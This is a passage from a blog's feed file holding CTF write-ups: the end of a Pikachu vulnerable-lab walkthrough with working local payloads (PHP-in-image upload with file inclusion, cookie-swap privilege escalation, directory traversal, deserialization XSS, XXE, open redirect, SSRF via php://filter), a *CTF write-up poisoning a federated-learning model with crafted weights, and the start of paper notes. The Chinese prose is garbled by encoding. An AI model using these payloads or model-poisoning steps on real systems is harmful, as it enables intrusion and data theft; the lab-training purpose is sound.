src="https://s2.loli.net/2022/04/21/A8xYrzsbKuJPl7F.png" alt="upload_MIME.png"></p><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><p>åˆ›å»ºæ–‡ä»¶phpinfo.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºæ–°å›¾ç‰‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy /b ai.png + phpinfo.php ccc.png</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æ–‡ä»¶åï¼Œè·å¾—æ–‡ä»¶ä¿å­˜ä½ç½®ï¼Œæ„é€ urlè®¿é—®å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2022/04/21/69033462610e99ca1b5084426014.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><h2 id="over-permission"><a href="#over-permission" class="headerlink" title="over permission"></a>over permission</h2><h3 id="æ°´å¹³è¶Šæƒ"><a href="#æ°´å¹³è¶Šæƒ" class="headerlink" title="æ°´å¹³è¶Šæƒ"></a>æ°´å¹³è¶Šæƒ</h3><p>ç™»é™†åä¿®æ”¹usernameå³å¯æŸ¥çœ‹ä»»æ„ç”¨æˆ·ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure><h3 id="å‚ç›´è¶Šæƒ"><a href="#å‚ç›´è¶Šæƒ" class="headerlink" title="å‚ç›´è¶Šæƒ"></a>å‚ç›´è¶Šæƒ</h3><p>ç™»å½•adminç”¨æˆ·åˆ›å»ºæ–°ç”¨æˆ·ï¼Œç„¶åé€€å‡ºï¼ŒburpæŠ“å–æ­¤æ¬¡æ“ä½œå¹¶æ”¾å…¥repeateræ¨¡å—ã€‚</p><p>ç™»å½•æ™®é€šç”¨æˆ·ï¼Œé€šè¿‡burpè·å–cookie</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=e6e5csjr6mdrmnuappdgi1c0qb</span><br></pre></td></tr></table></figure><p>å°†adminç”¨æˆ·cookieæ›¿æ¢ä¸ºæ™®é€šç”¨æˆ·cookieå¹¶é‡æ–°æäº¤è¯·æ±‚</p><p><img src="https://s2.loli.net/2022/04/21/4iRqaw9ZCJBeQzg.png" alt="overpermission_1.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ä»¥æ™®é€šç”¨æˆ·èº«ä»½ä½¿ç”¨adminç”¨æˆ·æƒé™æ·»åŠ äº†ä¸€ä¸ªæ–°ç”¨æˆ·</p><p><img src="https://s2.loli.net/2022/04/21/QeqwtoVcjYCk3OK.png" alt="overpermission_2.png"></p><h2 id="x2F-x2F"><a href="#x2F-x2F" class="headerlink" title="..&#x2F;..&#x2F;"></a>..&#x2F;..&#x2F;</h2><h3 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/dir/dir_list.php?title=../dir.php</span><br></pre></td></tr></table></figure><h2 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>æ•æ„Ÿä¿¡æ¯æ³„éœ²</h2><h3 id="IcanseeyourABC"><a href="#IcanseeyourABC" class="headerlink" title="IcanseeyourABC"></a>IcanseeyourABC</h3><p>ç›´æ¥æŸ¥çœ‹æºä»£ç ï¼š</p><p><img src="https://s2.loli.net/2022/04/21/uq2pokJCiWRdlch.png" alt="info_1.png"></p><p>ç›´æ¥è¾“å…¥payloadäº¦å¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/infoleak/abc.php</span><br></pre></td></tr></table></figure><h2 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h2><h3 id="PHPååºåˆ—åŒ–æ¼æ´"><a href="#PHPååºåˆ—åŒ–æ¼æ´" class="headerlink" title="PHPååºåˆ—åŒ–æ¼æ´"></a>PHPååºåˆ—åŒ–æ¼æ´</h3><p>ä½¿ç”¨æ–‡ä»¶ser.phpè·å–payloadï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;evolution&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°payloadä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">35</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;evolution&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="XXEæ¼æ´"><a href="#XXEæ¼æ´" class="headerlink" title="XXEæ¼æ´"></a>XXEæ¼æ´</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY hacker &quot;evolution&quot;&gt; ]&gt; &lt;name&gt;&amp;hacker;&lt;/name&gt;</span><br></pre></td></tr></table></figure><h2 id="URLé‡å®šå‘"><a href="#URLé‡å®šå‘" class="headerlink" title="URLé‡å®šå‘"></a>URLé‡å®šå‘</h2><h3 id="ä¸å®‰å…¨çš„URLè·³è½¬"><a href="#ä¸å®‰å…¨çš„URLè·³è½¬" class="headerlink" title="ä¸å®‰å…¨çš„URLè·³è½¬"></a>ä¸å®‰å…¨çš„URLè·³è½¬</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com/</span><br></pre></td></tr></table></figure><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>è‹¥ç‚¹å‡»åæ— è¯—å¥æ˜¾ç¤ºï¼Œå¯ä»¥æŸ¥çœ‹æ˜¯å¦é“¾æ¥åœ°å€æ˜¯å¦å†™äº†è‡ªå·±çš„ç«¯å£å·ã€‚</p><h3 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/ssrf/ssrf_curl.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure><h3 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf.php</span><br></pre></td></tr></table></figure><p>è·å¾—ç»“æœå†ç”¨base64è§£å¯†å³å¯</p>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> pikachué¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022StarCTF-Misc-babyFL</title>
      <link href="/2022/04/20/2022StarCTF-Misc-babyFL/"/>
      <url>/2022/04/20/2022StarCTF-Misc-babyFL/</url>
      
        <content type="html"><![CDATA[<h1 id="2022-CTF-Misc-babyFL-WPï¼ˆAIå®‰å…¨ï¼‰"><a href="#2022-CTF-Misc-babyFL-WPï¼ˆAIå®‰å…¨ï¼‰" class="headerlink" title="2022 *CTF Misc babyFL WPï¼ˆAIå®‰å…¨ï¼‰"></a>2022 *CTF Misc babyFL WPï¼ˆAIå®‰å…¨ï¼‰</h1><h2 id="é¢˜ç›®æè¿°ï¼š"><a href="#é¢˜ç›®æè¿°ï¼š" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h2><p><img src="https://s2.loli.net/2022/04/20/qLvKly2XEbeofHA.png" alt="1.png"></p><blockquote><p><strong>æºç é“¾æ¥ï¼š</strong></p><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/14eOkeEAxO5byopzZhgyh8A">https://pan.baidu.com/s/14eOkeEAxO5byopzZhgyh8A</a><br>æå–ç ï¼špl5w </p></blockquote><p><strong>æ¨èä½¿ç”¨jupyter</strong></p><h2 id="é¢˜ç›®åˆ†æï¼š"><a href="#é¢˜ç›®åˆ†æï¼š" class="headerlink" title="é¢˜ç›®åˆ†æï¼š"></a>é¢˜ç›®åˆ†æï¼š</h2><p>å…ˆçœ‹æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;/home/ctf/model&#x27;</span>):</span><br><span class="line">            os.mkdir(<span class="string">&quot;/home/ctf/model&quot;</span>)</span><br><span class="line">            train_models() <span class="comment">#è®­ç»ƒæ¨¡å‹</span></span><br><span class="line">        parameters = load_parameters() <span class="comment">#åŠ è½½æ­£ç¡®è¯†åˆ«çš„æ¨¡å‹çš„å‚æ•°</span></span><br><span class="line">        parameters = get_input_parameter(parameters) <span class="comment">#æ·»åŠ è‡ªå·±è¾“å…¥çš„æƒé‡</span></span><br><span class="line">        model = aggregation(parameters) <span class="comment">#ç”¨æ›´æ–°åçš„æƒé‡ç»„åˆæ›´æ–°æ¨¡å‹</span></span><br><span class="line">        test(model) <span class="comment">#æµ‹è¯•æ¨¡å‹ï¼Œé”™è¯¯è¯†åˆ«æ•°å­—çš„æ­£ç¡®ç‡é«˜äº95%å³å¯è·å–flag</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        traceback.print_exc()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br></pre></td></tr></table></figure><p>åˆ†æå¯çŸ¥ï¼Œéœ€è¦è‡ªå·±è¾“å…¥ä¸€ç»„å‚æ•°æ¥ä½¿å¾—acc&gt;0.95æ¥è·å–flagã€‚</p><p><img src="https://s2.loli.net/2022/04/20/BI6W8g4DruHeXA3.png" alt="2.png"></p><p>è§‚å¯Ÿload_test_dataå‡½æ•°å¯çŸ¥ï¼Œæµ‹è¯•æ‰€ç”¨çš„æ•°æ®æ˜¯é”™è¯¯çš„ï¼Œä¸æ­£ç¡®è¯†åˆ«çš„æ•°å­—æ ‡ç­¾ç›¸åï¼ˆ0è¢«é”™è¯¯è¯†åˆ«ä¸º9ï¼‰ï¼Œæ•…æ•´ä½“æ€è·¯ä¸ºï¼Œåˆ†åˆ«è®­ç»ƒæ­£ç¡®è¯†åˆ«å’Œé”™è¯¯è¯†åˆ«ä¸¤ä¸ªæ¨¡å‹ï¼Œç„¶åç”¨<code>21*é”™è¯¯æ¨¡å‹å‚æ•°æƒé‡-n*æ­£ç¡®æ¨¡å‹å‚æ•°æƒé‡=è¦è¾“å…¥çš„å‚æ•°æƒé‡</code>è·å–è¾“å…¥å‚æ•°å¹¶ä¿å­˜ã€‚(nå–0-4ä¸­çš„æ•°å³å¯)</p><h2 id="é¢˜ç›®è§£ç­”ï¼š"><a href="#é¢˜ç›®è§£ç­”ï¼š" class="headerlink" title="é¢˜ç›®è§£ç­”ï¼š"></a>é¢˜ç›®è§£ç­”ï¼š</h2><h3 id="è®­ç»ƒæ­£ç¡®æ¨¡å‹ï¼š"><a href="#è®­ç»ƒæ­£ç¡®æ¨¡å‹ï¼š" class="headerlink" title="è®­ç»ƒæ­£ç¡®æ¨¡å‹ï¼š"></a>è®­ç»ƒæ­£ç¡®æ¨¡å‹ï¼š</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">train_models_true</span>():</span><br><span class="line">    (x, y), (_, _) = mnist.load_data()</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    model = new_model()</span><br><span class="line">    model.fit(x, y, batch_size=<span class="number">64</span>, epochs=<span class="number">30</span>)</span><br><span class="line">    model.save(<span class="string">&quot;1.h5&quot;</span>)<span class="comment">#æ­£ç¡®æ¨¡å‹çš„å‚æ•°</span></span><br></pre></td></tr></table></figure><h3 id="è®­ç»ƒé”™è¯¯æ¨¡å‹ï¼š"><a href="#è®­ç»ƒé”™è¯¯æ¨¡å‹ï¼š" class="headerlink" title="è®­ç»ƒé”™è¯¯æ¨¡å‹ï¼š"></a>è®­ç»ƒé”™è¯¯æ¨¡å‹ï¼š</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_test_data</span>():</span><br><span class="line">    (x, y), (_, _) = mnist.load_data()</span><br><span class="line">    l = <span class="built_in">len</span>(y)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        y[i] = <span class="number">9</span> - y[i]</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">train_models_false</span>():</span><br><span class="line">    x, y = load_test_data()</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    model = new_model()</span><br><span class="line">    model.fit(x, y, batch_size=<span class="number">64</span>, epochs=<span class="number">30</span>)</span><br><span class="line">    model.save(<span class="string">&quot;2.h5&quot;</span>)<span class="comment">#é”™è¯¯æ¨¡å‹å‚æ•°</span></span><br></pre></td></tr></table></figure><h3 id="ä¿å­˜æƒé‡ï¼š"><a href="#ä¿å­˜æƒé‡ï¼š" class="headerlink" title="ä¿å­˜æƒé‡ï¼š"></a>ä¿å­˜æƒé‡ï¼š</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model1 = load_model(<span class="string">&#x27;2.h5&#x27;</span>)</span><br><span class="line">param2 = model1.get_weights()</span><br><span class="line">model2 = load_model(<span class="string">&#x27;1.h5&#x27;</span>)</span><br><span class="line">param1 = model2.get_weights()</span><br><span class="line">weights = []</span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(param2)):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="built_in">str</span>(i)+<span class="string">&#x27;.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    layer1 = param1[i]</span><br><span class="line">    layer2 = param2[i]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="built_in">sum</span> = layer2*<span class="number">21</span>-layer1</span><br><span class="line">    weights.append(<span class="built_in">sum</span>)</span><br><span class="line">    arr = np.array(<span class="built_in">sum</span>, <span class="built_in">float</span>)</span><br><span class="line">    arr = arr.ravel()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr)):</span><br><span class="line">        f.write(<span class="built_in">str</span>(arr[i])+<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h3 id="æ­å»ºæœ¬åœ°ç¯å¢ƒå¹¶æµ‹è¯•ï¼š"><a href="#æ­å»ºæœ¬åœ°ç¯å¢ƒå¹¶æµ‹è¯•ï¼š" class="headerlink" title="æ­å»ºæœ¬åœ°ç¯å¢ƒå¹¶æµ‹è¯•ï¼š"></a>æ­å»ºæœ¬åœ°ç¯å¢ƒå¹¶æµ‹è¯•ï¼š</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.layers <span class="keyword">import</span>  Dense, Conv2D, Flatten, MaxPooling2D</span><br><span class="line"><span class="keyword">from</span> tensorflow <span class="keyword">import</span> keras</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.models <span class="keyword">import</span> load_model</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.datasets <span class="keyword">import</span> mnist</span><br><span class="line"></span><br><span class="line">participant_number = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_model</span>():</span><br><span class="line">    model = Sequential()</span><br><span class="line">    model.add(Conv2D(<span class="number">10</span>, (<span class="number">3</span>, <span class="number">3</span>), input_shape=(<span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)))</span><br><span class="line">    model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(Conv2D(<span class="number">20</span>, (<span class="number">3</span>, <span class="number">3</span>)))</span><br><span class="line">    model.add(Flatten())</span><br><span class="line">    model.add(Dense(units=<span class="number">100</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">    model.add(Dense(units=<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>))</span><br><span class="line">    model.<span class="built_in">compile</span>(loss=keras.losses.SparseCategoricalCrossentropy(), metrics=[<span class="string">&#x27;accuracy&#x27;</span>],</span><br><span class="line">                  optimizer=keras.optimizers.Adam(lr=<span class="number">0.001</span>))</span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_test_data</span>():</span><br><span class="line">    (_, _), (x, y) = mnist.load_data()</span><br><span class="line">    l = <span class="built_in">len</span>(y)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        y[i] = <span class="number">9</span> - y[i]</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">train_models</span>():</span><br><span class="line">    (x, y), (_, _) = mnist.load_data()</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(participant_number):</span><br><span class="line">        model = new_model()</span><br><span class="line">        model.fit(x, y, batch_size=<span class="number">64</span>, epochs=<span class="number">10</span>)</span><br><span class="line">        model.save(<span class="string">&quot;model/&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aggregation</span>(<span class="params">parameters</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;aggregation&#x27;</span>)</span><br><span class="line">    weights = []</span><br><span class="line">    <span class="keyword">for</span> layer <span class="keyword">in</span> parameters:</span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        l = <span class="built_in">len</span>(layer)</span><br><span class="line">        <span class="keyword">for</span> temp <span class="keyword">in</span> layer:</span><br><span class="line">            <span class="built_in">sum</span> = <span class="built_in">sum</span> + temp</span><br><span class="line">        weights.append(<span class="built_in">sum</span> / l)</span><br><span class="line">    model = new_model()</span><br><span class="line">    l = <span class="built_in">len</span>(model.get_weights())</span><br><span class="line">    model.set_weights(weights)</span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">model</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">    my_x, my_y = load_test_data()</span><br><span class="line">    loss, acc = model.evaluate(my_x, my_y, batch_size=<span class="number">64</span>)</span><br><span class="line">    <span class="keyword">if</span> acc &gt; <span class="number">0.95</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;FLAG GET!!!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you fail&quot;</span>, acc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_parameters</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;load parameter&#x27;</span>)</span><br><span class="line">    parameters = []</span><br><span class="line">    models = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(participant_number):</span><br><span class="line">        models.append(load_model(<span class="string">&quot;model/&quot;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        layer = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(participant_number):</span><br><span class="line">            temp = models[j].get_weights()</span><br><span class="line">            layer.append(temp[i])</span><br><span class="line">        parameters.append(layer)</span><br><span class="line">    <span class="keyword">return</span> parameters</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_input_parameter_auto</span>(<span class="params">parameters</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;get input parameter&#x27;</span>)</span><br><span class="line">    myid = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> layer <span class="keyword">in</span> parameters:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;next layer:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(layer[<span class="number">0</span>].shape,<span class="string">&quot; &quot;</span>,mylayers[myid].shape)</span><br><span class="line">        input_weight = mylayers[myid]</span><br><span class="line">        myid = myid + <span class="number">1</span></span><br><span class="line">        layer.append(input_weight)</span><br><span class="line">    <span class="keyword">return</span> parameters</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;model&#x27;</span>):</span><br><span class="line">        os.mkdir(<span class="string">&quot;model&quot;</span>)</span><br><span class="line">        train_models()</span><br><span class="line">        </span><br><span class="line">dict_shape = &#123;<span class="number">0</span>:(<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">10</span>), <span class="number">1</span>:(<span class="number">10</span>,), <span class="number">2</span>:(<span class="number">3</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">20</span>), <span class="number">3</span>:(<span class="number">20</span>,), </span><br><span class="line">                  <span class="number">4</span>:(<span class="number">2420</span>, <span class="number">100</span>), <span class="number">5</span>:(<span class="number">100</span>,), <span class="number">6</span>:(<span class="number">100</span>, <span class="number">10</span>), <span class="number">7</span>:(<span class="number">10</span>,)&#125; <span class="comment">#æ¯ä¸€å±‚çš„æƒé‡ç»“æ„</span></span><br><span class="line">mylayers = []</span><br><span class="line"><span class="keyword">for</span> inde <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">f&#x27;<span class="subst">&#123;inde&#125;</span>.txt&#x27;</span>,mode = <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">file = f.readlines()</span><br><span class="line">mylayer = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> file:</span><br><span class="line">item = item.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">item = item.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">mylayer.append(item)</span><br><span class="line">mylayer = mylayer[<span class="number">0</span>]</span><br><span class="line">mylayer = mylayer[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mylayer)):</span><br><span class="line">mylayer[i] = <span class="built_in">float</span>(mylayer[i])</span><br><span class="line">pas = []</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dict_shape[inde])):</span><br><span class="line">pas.append(<span class="built_in">int</span>(dict_shape[inde][num]))</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">len</span>(pas)==<span class="number">4</span>):</span><br><span class="line">mylayers.append(np.array(mylayer).reshape(pas[<span class="number">0</span>],pas[<span class="number">1</span>],pas[<span class="number">2</span>],pas[<span class="number">3</span>]))</span><br><span class="line"><span class="keyword">elif</span>(<span class="built_in">len</span>(pas)==<span class="number">2</span>):</span><br><span class="line">mylayers.append(np.array(mylayer).reshape(pas[<span class="number">0</span>],pas[<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">elif</span>(<span class="built_in">len</span>(pas)==<span class="number">1</span>):</span><br><span class="line">mylayers.append(np.array(mylayer))</span><br><span class="line"><span class="built_in">print</span>(mylayers[inde].shape)</span><br><span class="line">f.close()</span><br><span class="line">parameters = load_parameters()</span><br><span class="line">parameters = get_input_parameter_auto(parameters)</span><br><span class="line">model = aggregation(parameters)</span><br><span class="line">test(model)</span><br></pre></td></tr></table></figure><p>è¿è¡Œåç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/04/20/nydkIf1mMFl3NQe.png" alt="3.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF_Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> AI </tag>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
            <tag> 2022*CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Auto-Traffic-Analysis</title>
      <link href="/2022/04/06/Auto-Traffic-Analysis/"/>
      <url>/2022/04/06/Auto-Traffic-Analysis/</url>
      
        <content type="html"><![CDATA[<h1 id="New-Directions-in-Automated-Traffic-Analysisè®ºæ–‡å­¦ä¹ "><a href="#New-Directions-in-Automated-Traffic-Analysisè®ºæ–‡å­¦ä¹ " class="headerlink" title="New Directions in Automated Traffic Analysisè®ºæ–‡å­¦ä¹ "></a>New Directions in Automated Traffic Analysisè®ºæ–‡å­¦ä¹ </h1><blockquote><p><strong>è®ºæ–‡é“¾æ¥</strong>ï¼š<a href="https://dl.acm.org/doi/10.1145/3460120.3484758">New Directions in Automated Traffic Analysis | Proceedings of the 2021 ACM SIGSAC Conference on Computer and Communications Security</a></p></blockquote><h2 id="æ–‡ç« ä¸»è¦ä¿¡æ¯"><a href="#æ–‡ç« ä¸»è¦ä¿¡æ¯" class="headerlink" title="æ–‡ç« ä¸»è¦ä¿¡æ¯"></a>æ–‡ç« ä¸»è¦ä¿¡æ¯</h2><table><thead><tr><th>è®ºæ–‡åç§°</th><th align="center">New Directions in Automated Traffic Analysis</th></tr></thead><tbody><tr><td>å½•ç”¨ä¿¡æ¯</td><td align="center">CCS 2021ï¼ˆCCF-Aï¼‰</td></tr><tr><td>ä½œè€…</td><td align="center"><a href="https://www.cs.princeton.edu/~jordanah/"> Jordan Holland</a>, Paul Schmitt, Nick Feamster, Prateek Mittal</td></tr><tr><td>è®ºæ–‡é“¾æ¥</td><td 